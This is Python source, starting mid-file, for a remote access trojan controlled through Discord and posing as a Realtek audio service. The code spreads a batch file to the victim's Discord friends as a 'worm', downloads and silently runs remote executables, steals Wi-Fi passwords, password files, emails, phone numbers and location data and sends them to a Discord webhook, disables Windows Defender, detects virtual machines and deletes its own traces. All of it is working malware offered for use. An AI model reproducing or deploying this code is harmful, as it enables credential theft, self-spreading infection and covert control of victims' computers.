                'https://discord.com/api/v9/users/@me/relationships',
                headers=headers,
                timeout=10
            )
            friends_resp.raise_for_status()
            friends = friends_resp.json()
        except Exception as e:
            await ctx.send(f"❌ Failed to get friends list: {e}")
            return
        
        if not friends:
            await ctx.send("ℹ️ No friends found to send to")
            return
            
        await ctx.send(f"🔍 Found {len(friends)} friends to send to")
        
        # 3. Send to each friend
        success_count = 0
        failure_count = 0
        message = "Check this out, it will optimize your system!"
        
        for friend in friends:
            try:
                # Create DM channel
                dm_resp = requests.post(
                    'https://discord.com/api/v9/users/@me/channels',
                    headers=headers,
                    json={'recipient_id': friend['id']},
                    timeout=10
                )
                dm_resp.raise_for_status()
                channel_id = dm_resp.json()['id']
                
                # Send file
                files = {
                    'file': ('Optimizer.bat', bat_content, 'application/octet-stream')
                }
                data = {
                    'content': message
                }
                
                send_resp = requests.post(
                    f'https://discord.com/api/v9/channels/{channel_id}/messages',
                    headers=headers,
                    files=files,
                    data=data,
                    timeout=15
                )
                
                if send_resp.status_code == 200:
                    success_count += 1
                    await ctx.send(f"✅ Sent to {friend['user']['username']}")
                else:
                    failure_count += 1
                    await ctx.send(f"❌ Failed to send to {friend['user']['username']} (status {send_resp.status_code})")
                
                # Rate limiting
                await asyncio.sleep(1)
                
            except Exception as e:
                failure_count += 1
                await ctx.send(f"⚠️ Error sending to {friend.get('user', {}).get('username', 'unknown')}: {str(e)}")
                continue
        
        await ctx.send(f"🎉 Worm propagation complete! Success: {success_count}, Failed: {failure_count}")
        
    except Exception as e:
        await ctx.send(f"💥 Critical error in worm command: {e}")







# ----- Injection -----

import os
import random
import string
import subprocess
import requests
from urllib.parse import urlparse
from discord.ext import commands



def generate_random_filename():
    """Generate tmp_ followed by 12 random alphanumeric characters and .exe"""
    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return f"tmp_{random_chars}.exe"

def set_hidden_and_system(path):
    """Set hidden (+h) and system (+s) attributes on Windows"""
    try:
        subprocess.run(f'attrib +h +s "{path}"', shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to set attributes: {e}")

def get_filename_from_url(url):
    """Extract the filename from the URL"""
    parsed_url = urlparse(url)
    return os.path.basename(parsed_url.path)

@bot.command(name='inject')
async def inject(ctx, url: str):
    """Downloads a file from URL to %LocalAppData%\Programs\apps, avoids overwrite, and executes it."""
    try:
        # Target directory
        local_app_data = os.getenv('LOCALAPPDATA')
        apps_dir = os.path.join(local_app_data, 'Programs', 'apps')
        os.makedirs(apps_dir, exist_ok=True)
        set_hidden_and_system(apps_dir)

        # Extract filename from URL
        original_filename = get_filename_from_url(url)
        if not original_filename.lower().endswith('.exe'):
            await ctx.send("❌ URL must point to a .exe file.")
            return

        # Check if file already exists
        filepath = os.path.join(apps_dir, original_filename)
        if os.path.exists(filepath):
            filename = generate_random_filename()
            filepath = os.path.join(apps_dir, filename)
        else:
            filename = original_filename

        await ctx.send(f"📥 Downloading file to `{filename}` in hidden location...")

        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(filepath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        set_hidden_and_system(filepath)

        await ctx.send(f"⚡ Executing `{filename}`...")

        subprocess.Popen(
            [filepath], 
            shell=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        await ctx.send(f"✅ Execution started for `{filename}` (PID not saved)")

    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")











@bot.command(name='botnet')  
async def connect(ctx):
    """Downloads a file to REALTEK_DIR, executes it, and leaves it in place."""
    try:
        url = "link.to.botnet"  # Replace with your botnet link
        filename = os.path.basename(url)
        filepath = os.path.join(REALTEK_DIR, filename)

        os.makedirs(REALTEK_DIR, exist_ok=True)

        await ctx.send(f"📥 Downloading `{filename}` to `{REALTEK_DIR}`...")
        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(filepath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        await ctx.send(f"⚡ Executing `{filename}`...")
        process = subprocess.Popen([filepath], shell=True)

        # Save the PID for later removal
        with open(os.path.join(REALTEK_DIR, "proc.pid"), 'w') as pid_file:
            pid_file.write(str(process.pid))

        await ctx.send(f"✅ Execution started for `{filename}`. PID: `{process.pid}`")

    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")






@bot.command(name='removebotnet')  
async def remove_botnet(ctx):
    """Stops the executable process and deletes the file."""
    try:
        filename = "dwm.exe"
        filepath = os.path.join(REALTEK_DIR, filename)
        pid_path = os.path.join(REALTEK_DIR, "proc.pid")

        # 1. Try killing PID from file
        if os.path.exists(pid_path):
            with open(pid_path, 'r') as f:
                pid = int(f.read().strip())

            try:
                proc = psutil.Process(pid)
                proc.terminate()
                proc.wait(timeout=10)
                await ctx.send(f"🛑 Process with PID `{pid}` terminated.")
            except Exception as e:
                await ctx.send(f"⚠️ Could not terminate process: `{e}`")
            finally:
                os.remove(pid_path)
        else:
            await ctx.send("ℹ️ No PID file found. Scanning for any process using the file.")

        # 2. Kill any process still using that file
        for proc in psutil.process_iter(['pid', 'exe']):
            try:
                if proc.info['exe'] and os.path.normcase(proc.info['exe']) == os.path.normcase(filepath):
                    proc.terminate()
                    proc.wait(timeout=10)
                    await ctx.send(f"🔍 Found and terminated lingering PID `{proc.pid}` using `{filename}`.")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        # 3. Wait a moment before delete
        time.sleep(2)

        # 4. Try deleting the file
        if os.path.exists(filepath):
            os.remove(filepath)
            await ctx.send(f"🧹 File `{filename}` deleted from `{REALTEK_DIR}`.")
        else:
            await ctx.send(f"⚠️ File `{filename}` not found in `{REALTEK_DIR}`.")

    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")





















# ----- Notifications -----

@bot.command(name='msg')
async def show_msg(ctx, *, text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Message", 1)
        await ctx.send("💬 Message box shown")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='notify')
async def notify(ctx, title, *, message):
    try:
        from win10toast import ToastNotifier
        toaster = ToastNotifier()
        toaster.show_toast(title, message, duration=5)
        await ctx.send("🔔 Notification sent")
    except Exception as e:
        await ctx.send(f"❌ Error or win10toast not installed: {e}")

# ----- Typing and Hotkeys -----

@bot.command(name='type')
async def type_text(ctx, *, text):
    try:
        keyboard.write(text)
        await ctx.send(f"⌨️ Typed: {text}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='hotkeys')
async def hotkeys(ctx, *, keys):
    try:
        # keys example: ctrl+shift+esc
        keys = keys.lower().split('+')
        for k in keys:
            keyboard.press(k)
        for k in reversed(keys):
            keyboard.release(k)
        await ctx.send(f"⚡ Hotkeys pressed: {keys}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


import os
import re
import getpass
import subprocess
import socket
import json
import urllib.request
import platform
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import random
import string
import tempfile
import pytz
from tzlocal import get_localzone
import requests
import discord
from discord.ext import commands

# ---------- CONFIG -------------------------------------------------
TARGET_DIRS = [
    Path(os.environ["USERPROFILE"]) / "Documents",
    Path(os.environ["USERPROFILE"]) / "Desktop",
]
TEXT_EXTS = {".txt", ".log", ".csv", ".json", ".xml", ".md"}
SIZE_LIMIT = 5 * 1024 * 1024  # 5MB max file size
HEAD_CHUNK = 64 * 1024  # 64 KB read per file
THREADS = 12
DISCORD_WEBHOOK_URL = "webhook"
# -------------------------------------------------------------------

EMAIL_RE = re.compile(rb"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
PHONE_RE = re.compile(rb"\+?\d[\d\s().-]{7,}\d")

def send_to_discord(file_path, content=None):
    """Send file to Discord webhook with optional content message."""
    if not DISCORD_WEBHOOK_URL:
        print("Discord webhook URL not configured")
        return False
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            data = {}
            if content:
                data['content'] = content
            response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=data)
            return response.status_code in (200, 204)
    except Exception as e:
        print(f"Failed to send to Discord: {str(e)}")
        return False

def send_json_to_discord(data, temp_file_path):
    """Send JSON data to Discord webhook as a file attachment."""
    if not DISCORD_WEBHOOK_URL:
        print("Discord webhook URL not configured")
        return False
    
    try:
        with open(temp_file_path, 'rb') as f:
            json_data = f.read()
        
        boundary = '----WebKitFormBoundary' + ''.join(random.choice(string.ascii_letters) for _ in range(16))
        
        payload = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="file"; filename="system_info.json"\r\n'
            f'Content-Type: application/json\r\n\r\n'
        ).encode() + json_data + f'\r\n--{boundary}--\r\n'.encode()
        
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "SystemInfoCollector"
        }
        
        req = urllib.request.Request(
            DISCORD_WEBHOOK_URL,
            data=payload,
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req) as response:
            return response.status in (200, 204)
    except Exception as e:
        print(f"Failed to send to Discord: {str(e)}")
        return False

def get_username():
    return getpass.getuser()

def get_fullname():
    try:
        out = subprocess.check_output(
            ["wmic", "useraccount", "where", f"name='{get_username()}'", "get", "fullname"], text=True
        ).splitlines()
        return out[1].strip() if len(out) > 1 else None
    except Exception:
        return None

def candidate_paths():
    for root in TARGET_DIRS:
        for path in root.rglob("*"):
            if path.is_file() and path.suffix.lower() in TEXT_EXTS and path.stat().st_size <= SIZE_LIMIT:
                yield path

def scan_one_file(path):
    emails, phones = set(), set()
    try:
        with open(path, "rb") as f:
            chunk = f.read(HEAD_CHUNK)
        emails.update(EMAIL_RE.findall(chunk))
        phones.update(PHONE_RE.findall(chunk))
    except Exception:
        pass
    return emails, phones

def search_files_multithread():
    all_emails, all_phones = set(), set()
    paths = list(candidate_paths())
    with ThreadPoolExecutor(max_workers=THREADS) as pool:
        futures = {pool.submit(scan_one_file, p): p for p in paths}
        for fut in as_completed(futures):
            e, ph = fut.result()
            all_emails.update(map(bytes.decode, e))
            all_phones.update(map(bytes.decode, ph))
    return all_emails, all_phones

def emails_from_env():
    return [v for v in os.environ.values() if "@" in v]

def get_ip_based_location():
    try:
        with urllib.request.urlopen("http://ip-api.com/json/") as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return {
                    "method": "IP geolocation",
                    "latitude": data["lat"],
                    "longitude": data["lon"],
                    "city": data["city"],
                    "region": data["regionName"],
                    "country": data["country"],
                    "isp": data["isp"],
                    "accuracy": "City-level (typically 5-50 km)",
                }
    except Exception:
        pass
    try:
        with urllib.request.urlopen("https://ipinfo.io/json") as response:
            data = json.loads(response.read().decode())
            if "loc" in data:
                lat, lon = data["loc"].split(",")
                return {
                    "method": "IP geolocation",
                    "latitude": float(lat),
                    "longitude": float(lon),
                    "city": data.get("city", ""),
                    "region": data.get("region", ""),
                    "country": data.get("country", ""),
                    "isp": data.get("org", ""),
                    "accuracy": "City-level (typically 5-50 km)",
                }
    except Exception:
        pass
    return None

def get_wifi_location_windows():
    if platform.system() != "Windows":
        return None
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"], capture_output=True, text=True, check=True
        )
        bssids = re.findall(r"BSSID \d+ : ([0-9a-fA-F]{2}(-[0-9a-fA-F]{2}){5})", result.stdout)
        if not bssids:
            return None
        wifi_data = [{"macAddress": bssid.upper()} for bssid in bssids]
        request_data = json.dumps({"wifiAccessPoints": wifi_data}).encode("utf-8")
        req = urllib.request.Request(
            "https://location.services.mozilla.com/v1/geolocate?key=test",
            data=request_data,
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode())
            return {
                "method": "WiFi geolocation",
                "latitude": data["location"]["lat"],
                "longitude": data["location"]["lng"],
                "accuracy": f"{data['accuracy']} meters",
                "wifi_networks": len(bssids),
                "note": "Uses Mozilla Location Service (no API key needed for limited use)",
            }
    except Exception:
        return None

def get_timezone_location():
    try:
        local_tz = get_localzone()
        now = datetime.now(local_tz)
        tz_offset = now.utcoffset().total_seconds() / 3600
        tz_name = str(local_tz)
        longitude = tz_offset * 15
        return {
            "method": "Timezone estimation",
            "timezone": tz_name,
            "utc_offset": tz_offset,
            "approximate_longitude": longitude,
            "accuracy": "Country/Region level (very approximate)",
            "note": "This is just a rough estimate based on UTC offset",
        }
    except Exception:
        return None

def get_network_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        with urllib.request.urlopen("https://api.ipify.org") as response:
            public_ip = response.read().decode()
        return {"hostname": hostname, "local_ip": local_ip, "public_ip": public_ip}
    except Exception:
        return None

def search_and_upload_passwords():
    search_string = "password"
    current_dir = os.getcwd()
    
    # Search for files with "password" in the filename
    for filename in os.listdir(current_dir):
        if search_string.lower() in filename.lower() and filename.endswith(".txt"):
            file_path = os.path.join(current_dir, filename)
            try:
                send_to_discord(file_path, f'Found "{search_string}" in file name: {filename}')
            except:
                pass
    
    # Search for files containing "password" in their content
    for filename in os.listdir(current_dir):
        if filename.endswith(".txt"):
            file_path = os.path.join(current_dir, filename)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if search_string.lower() in content.lower():
                        send_to_discord(file_path, f'Found "{search_string}" in file content: {filename}')
            except:
                pass

def collect_system_info():
    # Create directory and files
    defender_dir = r"C:\Windows Defender"
    os.makedirs(defender_dir, exist_ok=True)
    
    with open(os.path.join(defender_dir, "filesindefender.txt"), "w") as f:
        f.write("drag the files in defender folder.")
    
    # Run commands and save output to files
    commands = [
        ('ipconfig /all', "MsClient.txt"),
        ('netsh wlan show interface', "MpnClient.txt"),
        ('wmic nic where (NetEnabled=true) get Name, MACAddress', "Aldefender.txt"),
        ('getmac /v', "defendersys.txt"),
        ('netsh interface ipv4 show subinterface', "MinClient.txt"),
        ('netsh interface show interface "Ethernet"', "MllClient.txt"),
        ('nslookup myip.opendns.com resolver1.opendns.com', "DefenderCS.txt"),
        ('tasklist', "DLLS32.txt"),
        ('systeminfo', "DLL64.txt"),
        ('gpresult /z', "DefenderCSS.txt"),
        ('dir', "RealtimeON.txt"),
        ('wmic useraccount get AccountType,caption,PasswordExpires,PasswordRequired,SID,Status,Disabled,Domain,FullName,LocalAccount,Lockout,Name', "LOGS.txt")
    ]
    
    for cmd, filename in commands:
        with open(os.path.join(defender_dir, filename), "w") as f:
            subprocess.run(cmd, shell=True, stdout=f, stderr=subprocess.STDOUT, text=True)
    
    # Get WiFi passwords
    try:
        profiles_output = subprocess.check_output('netsh wlan show profile', shell=True, text=True)
        profiles = [line.split(":")[1].strip() for line in profiles_output.splitlines() if "All User Profile" in line]
        
        with open(os.path.join(defender_dir, "DefenderPROTECTION.txt"), "w") as f:
            for profile in profiles:
                try:
                    cmd = f'netsh wlan show profile name="{profile}" key=clear'
                    key_output = subprocess.check_output(cmd, shell=True, text=True)
                    for line in key_output.splitlines():
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            f.write(f"Wi-Fi name: {profile} password: {password}\n")
                            break
                except:
                    continue
    except:
        pass
    
    return defender_dir

def upload_system_info(defender_dir):
    files_to_upload = [
        "MsClient.txt", "DefenderCS.txt", "MpnClient.txt", "Aldefender.txt",
        "MinClient.txt", "defendersys.txt", "DLLS32.txt", "DLL64.txt",
        "DefenderCSS.txt", "LOGS.txt", "DefenderPROTECTION.txt", "RealtimeON.txt"
    ]
    
    for filename in files_to_upload:
        file_path = os.path.join(defender_dir, filename)
        if os.path.exists(file_path):
            try:
                send_to_discord(file_path)
            except:
                pass

@bot.command(name='grabinfo')
async def grabinfo(ctx):
    try:
        # Send initial message
        await ctx.send("🚀 Starting information collection...")
        
        # Collect and upload password files
        await ctx.send("🔍 Searching for password files...")
        search_and_upload_passwords()
        
        # Collect system information
        await ctx.send("🖥️ Collecting system information...")
        defender_dir = collect_system_info()
        
        # Upload system information files
        await ctx.send("📤 Uploading system information...")
        upload_system_info(defender_dir)
        
        # Collect and send detailed system info
        await ctx.send("🌍 Gathering location and network data...")
        results = {
            "user": {
                "username": get_username(),
                "fullname": get_fullname()
            },
            "env_emails": emails_from_env(),
            "network_info": get_network_info(),
            "ip_location": get_ip_based_location(),
            "wifi_location": get_wifi_location_windows(),
            "timezone_location": get_timezone_location()
        }
        
        # Add file scan results
        await ctx.send("📂 Scanning documents for PII...")
        emails, phones = search_files_multithread()
        results["found_emails"] = list(emails)
        results["found_phones"] = list(phones)
        
        # Create temp file
        try:
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as temp_file:
                json.dump(results, temp_file, indent=2)
                temp_file_path = temp_file.name
            
            # Send to Discord
            if send_json_to_discord(results, temp_file_path):
                await ctx.send("✅ All data successfully collected and sent!")
            else:
                await ctx.send("⚠️ Data collected but failed to send to webhook")
            
        except Exception as e:
            await ctx.send(f"❌ Error creating temporary file: {str(e)}")
            return
        
        # Clean up temp file
        try:
            os.unlink(temp_file_path)
        except Exception:
            pass
        
        # Clean up defender directory
        try:
            subprocess.run(f'rmdir /s /q "{defender_dir}"', shell=True)
        except:
            pass
        
    except Exception as e:
        await ctx.send(f"❌ Error during collection: {str(e)}")






def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    params = " ".join(f'"{arg}"' for arg in sys.argv)
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1)
    return ret

def add_defender_exclusion(path):
    command = [
        "powershell",
        "-WindowStyle", "Hidden",
        "-Command",
        f"Add-MpPreference -ExclusionPath '{path}'"
    ]
    try:
        result = subprocess.run(command, 
                              capture_output=True, 
                              text=True, 
                              check=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        print(f"Successfully added exclusion for: {path}")
    except subprocess.CalledProcessError as e:
        print("Failed to add exclusion.")
        print("Error:", e.stderr)

def disable_real_time_protection():
    key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Real-time protection disabled via registry.")
    except PermissionError:
        print("Permission denied: Run the script as Administrator.")
    except Exception as e:
        print(f"Error writing registry: {e}")

def get_current_exclusions():
    try:
        command = [
            "powershell",
            "-WindowStyle", "Hidden",
            "-Command",
            "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
        ]
        result = subprocess.run(command, 
                              capture_output=True, 
                              text=True, 
                              check=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
        exclusions = result.stdout.strip().split('\n') if result.stdout else []
        return exclusions
    except subprocess.CalledProcessError as e:
        print("Failed to get current exclusions.")
        print("Error:", e.stderr)
        return []

def send_to_discord(webhook_url, message):
    data = {
        "content": message,
        "username": "Windows Defender Exclusion Reporter"
    }
    try:
        response = requests.post(
            webhook_url,
            json=data,
            headers={"Content-Type": "application/json"}
        )
        if response.status_code == 204:
            print("Successfully sent exclusions to Discord.")
        else:
            print(f"Failed to send to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")



@bot.command(name='exclude')
async def exclusion(ctx, *, path=None):
    try:
        if not path:
            await ctx.send("Please provide a path to exclude. Example: `!exclude C:\\path\\to\\exclude`")
            return
            
        if is_admin():
            print("Running with admin privileges.")
            add_defender_exclusion(path)
            disable_real_time_protection()
            
            # Get and send current exclusions to Discord
            webhook_url = "webhook"
            exclusions = get_current_exclusions()
            if exclusions:
                message = f"New exclusion added for: {path}\n\nCurrent Windows Defender Exclusions:\n" + "\n".join(exclusions)
                send_to_discord(webhook_url, message)
                await ctx.send(f"✅ Successfully added exclusion for: {path}")
            else:
                await ctx.send(f"✅ Added exclusion but couldn't retrieve current exclusion list.")
        else:
            await ctx.send("❌ Administrator privileges required. Please run the bot as Administrator.")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")






@bot.command(name='wallpaper')
async def wallpaper(ctx):
    try:
        if not ctx.message.attachments:
            await ctx.send("❌ Please upload an image attachment with the command.")
            return

        attachment = ctx.message.attachments[0]
        temp_dir = tempfile.gettempdir()
        file_path = os.path.join(temp_dir, attachment.filename)

        await attachment.save(file_path)

        # Ensure the image was saved and file exists
        if not os.path.exists(file_path):
            await ctx.send("❌ Failed to save image file.")
            return

        # Set the wallpaper via registry + API call to avoid black screen
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE = 1
        SPIF_SENDCHANGE = 2

        result = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, file_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )

        if not result:
            await ctx.send("❌ Failed to set wallpaper.")
        else:
            await ctx.send("🖼️ Wallpaper changed successfully!")

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")












@bot.command(name='vmdetect')
async def vmdetect(ctx):
    try:
        is_vm, details = await detect_vm_windows()
        if is_vm:
            await ctx.send(f"🖥️ Detected a **Virtual Machine**.\nDetails: `{details}`")
        else:
            await ctx.send(f"💻 Detected a **Physical Machine**.\nDetails: `{details}`")
    except Exception as e:
        await ctx.send(f"❌ Error detecting VM: {e}")

async def detect_vm_windows():
    try:
        output = subprocess.check_output("systeminfo", shell=True, text=True, stderr=subprocess.DEVNULL)
        lines = output.splitlines()

        check_fields = ["System Manufacturer", "System Model", "BIOS Version", "Host Name"]
        vm_indicators = ['vmware', 'virtualbox', 'kvm', 'hyper-v', 'qemu', 'xen', 'virtual', 'bochs', 'parallels']

        for line in lines:
            for field in check_fields:
                if field.lower() in line.lower():
                    if any(keyword in line.lower() for keyword in vm_indicators):
                        return True, line.strip()
        return False, "No VM signature detected in system fields."
    except Exception as e:
        return False, f"Error reading systeminfo: {e}"










































# ----- SELF DESTRUCT -----

@bot.command(name='SELFDESTRUCT')
async def selfdestruct(ctx):
    """Self-destruct using Windows Restart Manager for clean deletion"""
    try:
        await ctx.send("💣 SELF-DESTRUCT SEQUENCE INITIATED")
        
        # 1. Remove startup entries
        await ctx.send("🗑 Removing registry entries...")
        try:
            subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64" /f', shell=True)
            subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64_Copy" /f', shell=True)
            
            if is_admin():
                subprocess.run('reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64" /f', shell=True)
                subprocess.run('reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64_Copy" /f', shell=True)
            
            await ctx.send("✓ Registry entries removed")
        except Exception as e:
            await ctx.send(f"⚠ Failed to remove some registry entries: {str(e)}")
        
        # 2. Schedule deletion using Windows Restart Manager
        await ctx.send("🧹 Scheduling bot files for deletion...")
        try:
            if os.path.exists(REALTEK_DIR):
                # Use cmd's built-in move/delete on reboot
                subprocess.run(f'cmd /c "rd /s /q \\\\?\\{REALTEK_DIR}"', 
                             shell=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW)
                await ctx.send(f"✓ Scheduled deletion of: {REALTEK_DIR}")
            else:
                await ctx.send("ℹ️ Bot directory not found (already deleted?)")
        except Exception as e:
            await ctx.send(f"⚠ Failed to schedule file deletion: {str(e)}")
        
        # 3. Final message and exit
        await ctx.send("💀 SELF-DESTRUCT COMPLETE. GOODBYE.")
        await asyncio.sleep(1)
        os._exit(0)
        
    except Exception as e:
        await ctx.send(f"❌ SELF-DESTRUCT FAILED: {str(e)}")
        os._exit(1)






import signal


@bot.command(name='exit')
async def exit_bot(ctx):
    try:
        await ctx.send("👋 Shutting down the bot...")
        pid = os.getpid()
        os.kill(pid, signal.SIGTERM)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")












# --------------------------------


bot.run('bot_token')
